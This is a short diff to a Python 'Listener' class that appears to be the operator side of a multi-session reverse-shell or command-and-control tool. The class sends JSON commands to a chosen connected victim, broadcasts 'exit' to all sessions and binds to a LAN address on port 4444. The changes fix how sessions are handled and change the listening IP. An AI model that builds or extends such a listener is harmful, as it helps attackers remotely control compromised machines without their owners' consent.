@@ -39,13 +39,12 @@ class Listener:
 
 
 	def reliable_send(self, data):
-		if self.chosen_connection:
-			json_data = json.dumps(data)
-			if data == "exit":
-				for con in self.connections:
-					con[0].send(json_data.encode())
-			else:
-				self.chosen_connection[0].send(json_data.encode())
+		json_data = json.dumps(data)
+		if data == "exit":
+			for con in self.connections:
+				con[0].send(json_data.encode())
+		elif self.chosen_connection:
+			self.chosen_connection[0].send(json_data.encode())
 		else:
 			print(colored("[-] You didn't choose any connection yet", "red"))
 
@@ -55,8 +54,11 @@ class Listener:
 		while True:
 			print(json_data)
 			try:
-				json_data += self.chosen_connection[0].recv(1024).decode()
-				return json.loads(json_data)
+				if self.chosen_connection:
+					json_data += self.chosen_connection[0].recv(1024).decode()
+					return json.loads(json_data)
+				else:
+					return ""
 			except: continue
 
 
@@ -135,7 +137,7 @@ class Listener:
 
 
 if __name__ == "__main__":
-	listener = Listener("192.168.0.108", 4444)
+	listener = Listener("192.168.0.199", 4444)
 
 	listen_thread = threading.Thread(target=listener.listen)
 	listen_thread.start()
